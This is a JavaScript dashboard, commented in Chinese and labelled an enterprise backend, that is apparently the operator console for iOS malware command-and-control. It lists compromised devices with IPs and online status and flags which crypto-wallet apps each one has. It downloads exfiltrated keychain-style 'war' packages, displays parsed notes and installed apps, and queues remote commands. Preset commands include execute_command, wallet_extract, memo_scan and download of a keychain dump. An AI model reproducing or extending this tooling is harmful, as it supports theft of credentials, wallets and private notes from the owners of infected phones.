/* ═══ app.js · 企业后台（panel API · 对齐 c2mock.db 数据面） ═══ */
"use strict";
const $  = id => document.getElementById(id);
const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
const short = (s, n = 90) => { s = String(s ?? ""); return s.length > n ? s.slice(0, n) + "…" : s; };

/* 交付阶段进度（累计口径 8/18/46/58/72/86/100） */
const STAGE_COLOR = p => p >= 100 ? "var(--ok)" : p >= 86 ? "var(--acc2)" : p >= 46 ? "var(--warn)" : "var(--err)";
const progressBar = p => {
  p = Number(p ?? 0) || 0;
  return `<div style="display:flex;align-items:center;gap:6px" title="${p}%">
    <div style="width:56px;height:7px;border-radius:4px;background:var(--bg3);overflow:hidden">
      <div style="width:${p}%;height:100%;border-radius:4px;background:${STAGE_COLOR(p)}"></div></div>
    <span class="mono dim3" style="font-size:10.5px">${p}%</span></div>`;
};

const S = {
  auto: true, module: "overview",
  page: { apps: 1, war: 1, notes: 1 },
  kw:   { apps: "",  war: "", notes: "" },
  /* App 资产按设备分组：展开组(gN) + 最后一次数据 + 设备标签缓存 */
  expandApps: new Set(["g0"]),
  lastApps: null,
  devInfo: {}, devInfoTs: 0,
};

/* ── 模块元 ── */
const MODULES = {
  overview: ["仪表盘", "访问人数 · 设备 · 在线 · 采集面"],
  devices:  ["设备列表", "c2mock.db 聚合 · 点行看资产"],
  visits:   ["来访登记", "devices 台账 · sync 上报"],
  apps:     ["App 资产", "/u 回传 · 包名索引 · 原包不入库"],
  war:      ["war 回传", "/war 战果 · 按包名 · 原包不入库"],
  notes:    ["备忘录", "只显示解析结果"],
  commands: ["下发指令", "command_queue · beacon 应答"],
  access:   ["访问审计", "access_log"],
};
const $B = d => document.querySelectorAll("#nav button").forEach(b => b.classList.toggle("on", b.dataset.m === d));

function goto(m) {
  S.module = m;
  $B(m);
  document.querySelectorAll(".view").forEach(v => v.classList.toggle("on", v.dataset.m === m));
  $("crumb").textContent = `console / ${m}`;
  const t = MODULES[m] || ["-", ""];
  $("m-title").textContent = t[0];
  $("m-sub").textContent = t[1];
  fetchModule(m);
}
document.querySelectorAll("#nav button").forEach(b => b.onclick = () => goto(b.dataset.m));

/* ── 自动刷新 ── */
$("auto-sw").onclick = () => { S.auto = !S.auto; $("auto-sw").classList.toggle("on", S.auto); };
$("refresh").onclick = () => fetchModule(S.module);

/* ══ 模块数据拉取 ══ */
const FETCHERS = {
  overview: loadOverview, devices: loadDevices, visits: loadVisits,
  apps: () => loadAsset("apps", "u"),
  war: () => loadAsset("war", "war"), notes: loadNotes,
  commands: loadCommands, access: loadAccess,
};
function fetchModule(m) { (FETCHERS[m] || loadOverview)(); }

/* ── 仪表盘 ── */
const EP_ICON = { beacon: "◉", sync: "⇄", u: "+", nb: "≡", result: "✓", heartbeat: "♥", ph: "▣", war: "⚔", event: "✦", a: "✦" };
const EP_COLOR = { beacon: "ok", war: "vi", ph: "err", result: "a", heartbeat: "warn" };

function kpi(label, v, color, sup) {
  const badge = (sup !== undefined && sup !== null && sup > 0)
    ? ` <i class="mono" style="font-style:normal;color:var(--ok);font-weight:600">+${sup} 今日</i>`
    : "";
  return `<div class="kpi" style="--kc:${color}"><b>${v}</b><span>${label}${badge}</span></div>`;
}

async function loadOverview() {
  const j = await api("/panel/api/overview");
  if (!j) return;
  $("ts-mono").textContent = j.ts; $("tick").textContent = (j.ts || "").slice(11);
  $("kpis").innerHTML =
    kpi("访问人数", j.visits ?? 0, "var(--acc)", j.visits_today) +
    kpi("设备数", j.devices ?? 0, "var(--acc2)", j.new_devices) +
    kpi("在线设备", j.online ?? 0, "var(--ok)") +
    kpi("备忘录", j.notes ?? 0, "var(--warn)") +
    kpi("war 回传", j.war ?? 0, "var(--vi)") +
    kpi("App 包", j.apps_pkg ?? 0, "var(--err)");
  $("cnt-dev").textContent = j.devices ?? 0;
  $("cnt-war").textContent = j.war ?? 0;

  const c = j.counts || {};
  const max = Math.max(1, ...Object.values(c));
  $("ov-rows").innerHTML = Object.entries(c).map(([k, v]) => {
    const w = Math.round(v / max * 100);
    return `<tr><td><span class="tag ${EP_COLOR[k] || "a"}">${esc(EP_ICON[k] || "•")} ${esc(k)}</span></td>
      <td><div style="height:8px;border-radius:4px;background:var(--bg3)"><div style="width:${w}%;height:100%;border-radius:4px;background:linear-gradient(90deg,var(--acc),var(--vi))"></div></div></td>
      <td class="mono dim">${v}</td></tr>`;
  }).join("");

  const ol = j.online_devices || [];
  $("ov-online").innerHTML = ol.length
    ? ol.map(d => `<tr>
        <td class="mono dim3" title="${esc(d.uuid)}">${esc(short(d.uuid, 22))}</td>
        <td class="mono dim3">${esc(d.machine || "-")} · ${esc(d.ios ? "iOS " + d.ios : "-")}</td>
        <td><span class="tag ok">◉ online</span></td></tr>`).join("")
    : `<tr><td colspan="3" class="empty">10 分钟窗口内无在线设备</td></tr>`;
}

/* ── 设备列表（DB 解析 + 资产钻取）── */
async function loadDevices() {
  const j = await api("/panel/api/devices");
  if (!j) return;
  const rows = j.devices || [];
  $("cnt-dev").textContent = rows.length || 0;
  /* 头部口径：总数 · 今日新增 · 在线数 */
  const today = new Date(); const pad = n => String(n).padStart(2, "0");
  const td0 = `${today.getFullYear()}-${pad(today.getMonth() + 1)}-${pad(today.getDate())}`;
  const nToday = rows.filter(d => String(d.first_seen || "").startsWith(td0)).length;
  const nOnline = rows.filter(d => d.online).length;
  const meta = $("dev-meta");
  if (meta) meta.textContent = `设备 ${rows.length} 台 · 今日新增 ${nToday} 台 · 在线 ${nOnline} 台`;
  $("dev-rows").innerHTML = rows.map(d => `
    <tr class="clickable" style="cursor:pointer" onclick="openAsset('${esc(d.uuid)}')">
      <td><span class="tag ${d.online ? "ok" : "err"}">${d.online ? "◉ 在线" : "○ 离线"}</span></td>
      <td>${progressBar(d.progress)}</td>
      <td class="mono" title="${esc(d.uuid)}">${esc(short(d.uuid, 18))}</td>
      <td class="mono">${esc(d.machine || "-")}${d.deviceName ? ` <span class="dim3">@${esc(d.deviceName)}</span>` : ""}</td>
      <td><span class="tag warn mono">${esc(d.ios ? "iOS " + d.ios : "-")}</span></td>
      <td class="mono">${esc(d.ip || "-")}</td>
      <td>${(d.wallets || []).map(w =>
        `<span class="tag ok" style="margin:0 4px 2px 0">${esc(w.display || w.rule || w)}</span>`).join("")
        || `<span class="dim3">-</span>`}</td>
      <td class="mono">${d.notes_count ?? 0}</td>
      <td class="mono">${d.war_count ?? 0}</td>
      <td class="mono">${d.apps_count ?? 0}</td>
      <td class="mono dim3">${esc(d.first_seen || "-")}</td>
      <td class="mono dim3">${esc(d.last_seen || "-")}</td>
      <td><span class="tag vi">资产 ▸</span></td>
    </tr>`).join("") || `<tr><td colspan="13" class="empty">设备库为空</td></tr>`;
}

/* ── 设备资产钻取 ── */
async function openAsset(uuid) {
  $("dr-title").textContent = `设备资产 · ${short(uuid, 26)}`;
  $("dr-body").innerHTML = "loading…";
  $("drawer").classList.add("open");
  const j = await api(`/panel/api/device/${encodeURIComponent(uuid)}/assets`);
  if (!j) { $("dr-body").textContent = "加载失败"; return; }
  const fmtFile = f => String(f).replace(/[&<>"']/g, "");
  const names = (j.wallet_names || (j.wallets || []).map(w => w.display || w.rule || w) || []);
  $("dr-body").innerHTML = `
    <div style="margin-bottom:12px"><b>钱包 app（${names.length}） · 钱包映射规则</b>
      ${names.length ? `<div style="margin-top:6px">${names.map(w =>
        `<span class="tag ok" style="margin:0 6px 6px 0">${esc(w)}</span>`).join("")}</div>`
      : `<div class="dim3" style="font-size:11px">未发现钱包 app</div>`}</div>
    <div style="margin-bottom:10px"><b>war 战果包（${j.war_count ?? 0}）</b>
      <table style="margin-top:6px"><tbody>${(j.war_files || []).map(f =>
        `<tr><td class="mono dim3">${esc(f.ts)}</td><td class="mono dim">${esc(f.file)}</td>
         <td class="mono dim3">${f.size}B</td>
         <td><span class="lnk" onclick="download('war','${fmtFile(f.file)}')">原包 ↓</span></td></tr>`).join("")}</tbody></table></div>
    <div><b>App 资产 ${j.apps_count ?? 0}</b>
      <div class="dim3" style="font-size:11px;margin-top:4px">${esc((j.profile || {}).machine || "")} · ${esc((j.profile || {}).ios || "")}</div></div>`;
}
window.openAsset = openAsset;

/* ── 来访登记 ── */
async function loadVisits() {
  const j = await api("/panel/api/visits?n=200");
  if (!j) return;
  const raw = j.records || [];
  $("cnt-visits").textContent = j.total ?? raw.length;
  const vmeta = $("visits-meta");
  if (vmeta) vmeta.textContent = `来访 ${j.total ?? raw.length} · 今日新增 ${j.today_visits ?? 0}`;
  $("visit-rows").innerHTML = raw.map(d => `
    <tr>
      <td class="mono dim3">${esc(d.ts)}</td>
      <td class="mono">${esc(d.ip)}</td>
      <td>${esc(d.device_version || d.deviceVersion || "-")}</td>
      <td class="mono dim">${esc(short(d.domain || "-", 34))}</td>
      <td class="mono dim3">${esc(short(d.host || "-", 30))}</td>
      <td class="dim3" title="${esc(d.ua)}">${esc(short(d.ua || "-", 64))}</td>
    </tr>`).join("") || `<tr><td colspan="7" class="empty">暂无来访记录</td></tr>`;
}

/* ── App 资产 / war ── */
const ASSET_TABLE = {
  u:   { rows: "apps-rows", meta: "apps-meta", pager: "apps-pager" },
  war: { rows: "war-rows",  meta: "war-meta",  pager: "war-pager" },
};
/* ── App 资产（u）· 按设备分组、点击折叠 ── */
async function loadAsset(key, ep) {
  const t = ASSET_TABLE[key];
  const j = await api(`/panel/api/${ep}?kw=${encodeURIComponent(S.kw[key])}&page=${S.page[key]}&per=40`);
  if (!j) return;
  const totalPkg = j.total_pkgs || 0, totalRows = j.total || 0;
  $(t.meta).textContent = `留存包 ${totalPkg} 份 · ${totalRows} 条 · 第 ${j.page} 页`;
  $(key === "apps" ? "cnt-app" : "cnt-war").textContent = totalRows || 0;

  if (key === "u") {
    /* App 资产：按设备（lhu）分组渲染（点击组头折叠/展开） */
    S.lastApps = j;
    cacheDevInfo().then(() => { if (S.module === "apps") renderApps(); });
    setTimeout(renderApps, 0);
  } else {
    $(t.rows).innerHTML = (j.rows || []).map(a => `<tr>
        <td><span class="tag ${a.tbl === "wallet" ? "warn" : (a.tbl === "envelope" ? "a" : "vi")}">${esc(a.tbl || "-")}</span></td>
        <td class="mono">${esc(a.bundleId || "-")}</td>
        <td class="mono dim">${esc(a.service || "-")}</td>
        <td class="mono dim3">${esc(short(a.account || "-", 26))}</td>
        <td class="mono dim3">${esc(a.rowid ?? "-")}</td>
        <td class="mono dim3">${esc(short(a.file, 26))}</td>
        <td class="mono dim3">${esc(a.ts)}</td>
        <td><span class="lnk" onclick="download('war','${esc(a.file)}')">原包 ↓</span></td></tr>`)
      .join("") || `<tr><td colspan="8" class="empty">暂无回传包</td></tr>`;
  }

  const pages = Math.max(1, Math.ceil(totalRows / 40));
  $(t.pager).innerHTML = `
    <button class="btn sm" ${j.page <= 1 ? "disabled" : ""} onclick="pg('${key}',${j.page - 1})">‹ 上一页</button>
    <span>page ${j.page} / ${pages} · 共 ${totalRows} 行</span>
    <button class="btn sm" ${j.page >= pages ? "disabled" : ""} onclick="pg('${key}',${j.page + 1})">下一页 ›</button>`;
}

/* ── App 资产分组渲染 ── */
function appGroups(rows) {
  const map = new Map();
  for (const a of rows) {
    const g = map.get(a.lhu) || { lhu: a.lhu || "-", rows: [], last: "" };
    g.rows.push(a);
    map.set(a.lhu, g);
  }
  return [...map.values()];
}

function renderApps() {
  const j = S.lastApps;
  if (!j) return;
  const groups = appGroups(j.rows || []);
  if (S.expandApps.size === 0 && groups.length) S.expandApps.add("g0"); // 只剩默认首组展开

  let html = "", gi = 0;
  for (const g of groups) {
    const gid = "g" + gi++;
    const open = S.expandApps.has(gid);
    const de = S.devInfo[g.lhu] || {};
    const label =
      (de.deviceName ? ` @${esc(de.deviceName)}` : "") +
      (de.machine ? ` ${esc(de.machine)}` : "") +
      (de.ios ? ` · iOS ${esc(de.ios)}` : "");
    html += `<tr class="grp-row ${open ? "open" : ""}" onclick="toggleGroup('${gid}')">
      <td colspan="6">
        <span class="tag ${de.online ? "ok" : "a"}" title="cached">${de.online ? "◉ 在线" : "○ 设备"}</span>
        <span class="chev">${open ? "▾" : "▸"}</span>
        <b class="mono" title="${esc(g.lhu)}">${esc(short(g.lhu, 20))}</b>
        <span class="dim">${label || "-"}</span>
        <span class="tag warn mono" style="margin-left:10px">${g.rows.length} 个应用</span>
        <span class="mono dim3" style="margin-left:12px">${esc(g.last)}</span>
      </td></tr>`;
    html += g.rows.map(a => `<tr class="grp-body" ${open ? "" : "hidden"}>
        <td class="mono">${esc(a.bundleId || "-")}</td>
        <td class="dim">${esc(a.name || "-")}</td>
        <td class="mono dim3">${esc(short(a.uuid, 14))}</td>
        <td class="mono dim3">${esc(a.file)}</td>
        <td class="mono dim3">${esc(a.ts)}</td>
        <td><span class="lnk" onclick="event.stopPropagation();download('u','${esc(a.file)}')">原包 ↓</span></td></tr>`).join("");
  }
  $("apps-rows").innerHTML = html || `<tr><td colspan="6" class="empty">暂无回传包</td></tr>`;
}

function toggleGroup(gid) {
  if (S.expandApps.has(gid)) S.expandApps.delete(gid);
  else S.expandApps.add(gid);
  renderApps();
}
window.toggleGroup = toggleGroup;

$("apps-xall").onclick = () => {
  const groups = appGroups((S.lastApps || {}).rows || []);
  S.expandApps = new Set(groups.map((_, i) => "g" + i));
  renderApps();
};
$("apps-call").onclick = () => { S.expandApps.clear(); renderApps(); };

/* 设备标签缓存（uuid → machine/deviceName/ios/online），30s TTL */
async function cacheDevInfo(force) {
  if (!force && Date.now() - S.devInfoTs < 30000) return;
  const j = await api("/panel/api/devices");
  if (!j) return;
  (j.devices || []).forEach(d => { S.devInfo[d.uuid] = d; });
  S.devInfoTs = Date.now();
}
function pg(key, p) { if (p < 1) return; S.page[key] = p; fetchModule(S.module); }
window.pg = pg;
["apps", "war"].forEach(key => {
  $(key + "-search").onclick = () => { S.kw[key] = $(key + "-kw").value.trim(); S.page[key] = 1; fetchModule(S.module); };
  $(key + "-kw").onkeydown = e => { if (e.key === "Enter") $(key + "-search").onclick(); };
});

function download(ep, file) {
  window.open(`/panel/download?ep=${encodeURIComponent(ep)}&name=${encodeURIComponent(file)}`, "_blank");
}
window.download = download;

/* ── 备忘录：只显示解析结果 ── */
async function loadNotes() {
  const j = await api(`/panel/api/notes?kw=${encodeURIComponent(S.kw.notes || "")}&page=${S.page.notes || 1}&per=40`);
  if (!j) return;
  S.page.notes = j.page || 1;
  $("cnt-note").textContent = j.total ?? 0;
  $("notes-meta").textContent = `共 ${j.total ?? 0} 条 · 第 ${j.page} 页`;
  $("notes-rows").innerHTML = (j.rows || []).map(n => `
    <tr>
      <td class="mono dim3">${esc(n.id ?? "-")}</td>
      <td class="dim">${esc(n.title)}</td>
      <td class="dim3">${esc(short(n.snippet || "-", 90))}</td>
      <td class="mono dim3">${esc(n.mod)}</td>
      <td class="mono dim3">${esc(n.ts)}</td>
      <td class="mono dim3">${esc(short(n.lhu, 18))}</td>
    </tr>`).join("") || `<tr><td colspan="6" class="empty">暂无备忘录解析结果</td></tr>`;

  const pages = Math.max(1, Math.ceil((j.total ?? 0) / 40));
  $("notes-pager").innerHTML = `
    <button class="btn sm" ${(j.page || 1) <= 1 ? "disabled" : ""} onclick="pg('notes',${(j.page || 1) - 1})">‹ 上一页</button>
    <span>page ${j.page} / ${pages}</span>
    <button class="btn sm" ${(j.page || 1) >= pages ? "disabled" : ""} onclick="pg('notes',${(j.page || 1) + 1})">下一页 ›</button>`;
}
$("notes-search").onclick = () => { S.kw.notes = $("notes-kw").value.trim(); S.page.notes = 1; fetchModule(S.module); };
$("notes-kw").onkeydown = e => { if (e.key === "Enter") $("notes-search").onclick(); };

/* ── 下发指令（command_queue）── */
const PRESETS = {
  exit: JSON.stringify({ type: "exit" }, null, 2),
  execute_command: JSON.stringify({ type: "execute_command", params: {} }, null, 2),
  ls: JSON.stringify({ type: "ls", params: { path: "/var/mobile" } }, null, 2),
  download: JSON.stringify({ type: "download", params: { path: "/tmp/keychain_c2_dump.json" } }, null, 2),
  wallet_extract: JSON.stringify({ type: "wallet_extract", params: {} }, null, 2),
  memo_scan: JSON.stringify({ type: "memo_scan", params: {} }, null, 2),
  apps: JSON.stringify({ type: "apps", params: {} }, null, 2),
  custom: "{\n  \"type\": \"\",\n  \"params\": {},\n  \"once\": true\n}",
};
$("cmd-preset").onchange = () => { $("cmd-json").value = PRESETS[$("cmd-preset").value] ?? PRESETS.custom; };
$("cmd-json").value = PRESETS.exit;

$("cmd-once").onclick = () => {
  const sw = $("cmd-once");
  const on = !sw.classList.contains("on");
  sw.classList.toggle("on", on);
  try { const o = JSON.parse($("cmd-json").value || "{}"); o.once = on; $("cmd-json").value = JSON.stringify(o, null, 2); } catch (_) {}
};

async function loadCommands() {
  const j = await api("/panel/api/commands");
  if (!j) return;
  $("cmd-current").textContent = JSON.stringify(j.current || {}, null, 2);
  $("cmd-hist").innerHTML = (j.history || []).map(h => `
    <tr><td class="mono dim3">${esc(h.id ?? "")}</td>
    <td class="mono dim">${esc(h.command_id || "-")}</td>
    <td><span class="tag a">${esc(h.cmd_type || "-")}</span></td>
    <td class="mono dim3">${esc(short(h.params_json || "-", 70))}</td>
    <td class="mono dim3">${esc(h.armed_ts || "-")}</td>
    <td class="mono dim3">${esc(h.dispatched_ts || "-")}</td>
    <td class="mono dim3">${esc(h.client_ip || "-")}</td>
    <td><span class="tag ${h.state === "dispatched" ? "ok" : "warn"}">${esc(h.state || "-")}</span></td></tr>`).join("")
    || `<tr><td colspan="8" class="empty">暂无下发历史</td></tr>`;
}

$("cmd-send").onclick = async () => {
  let body;
  try { body = JSON.parse($("cmd-json").value); }
  catch (e) { alert("JSON 解析失败：" + e); return; }
  if (!body || !body.type) { alert("载荷需要 type 字段"); return; }
  const r = await fetch("/panel/api/commands", {
    method: "POST", cache: "no-store", credentials: "same-origin",
    headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
  if (r.status === 401) { window.location.href = "/admin"; return; }
  const j = await r.json().catch(() => ({}));
  if (r.ok) { $("cmd-current").textContent = JSON.stringify(j.current || {}, null, 2); loadCommands(); }
  else alert("下发失败 " + r.status);
};

$("cmd-clear").onclick = async () => {
  const r = await fetch("/panel/api/commands", {
    method: "POST", cache: "no-store", credentials: "same-origin",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type: "noop", once: true }) });
  const j = await r.json().catch(() => ({}));
  $("cmd-current").textContent = JSON.stringify(j.current || {}, null, 2);
  loadCommands();
};

/* ── 访问审计 ── */
const stc = v => (v >= 500 ? "err" : v >= 400 ? "warn" : "ok");
async function loadAccess() {
  const j = await api("/panel/api/access?n=150");
  if (!j) return;
  $("acc-rows").innerHTML = (j.rows || []).map(a => `
    <tr><td class="mono dim3">${esc(a.ts)}</td>
    <td><span class="tag ${a.role === "device" ? "ok" : "a"}">${esc(a.role || "-")}</span></td>
    <td class="mono">${esc(a.method)}</td>
    <td class="mono dim">${esc(short(a.path + (a.query ? "?" + a.query : ""), 56))}</td>
    <td class="mono dim3">${esc(a.client)}</td>
    <td class="s-${stc(a.status)} mono">${esc(a.status)}</td>
    <td class="mono dim3">${esc(a.cost_ms)}ms</td></tr>`).join("")
    || `<tr><td colspan="7" class="empty">暂无访问记录</td></tr>`;
}

/* ── 通用 API ── */
async function api(url, opts) {
  try {
    const r = await fetch(url, { cache: "no-store", credentials: "same-origin", ...(opts || {}) });
    if (r.status === 401) { window.location.href = "/admin"; return null; }
    if (!r.ok) throw new Error(r.status);
    return await r.json();
  } catch (e) {
    $("ts-mono").textContent = "fetch err: " + e;
    return null;
  }
}

/* ── 抽屉 ── */
$("dr-close").onclick = () => $("drawer").classList.remove("open");
document.addEventListener("keydown", e => { if (e.key === "Escape") $("drawer").classList.remove("open"); });

/* ── 轮询 ── */
setInterval(() => { if (S.auto) fetchModule(S.module); }, 2000);
goto("overview");
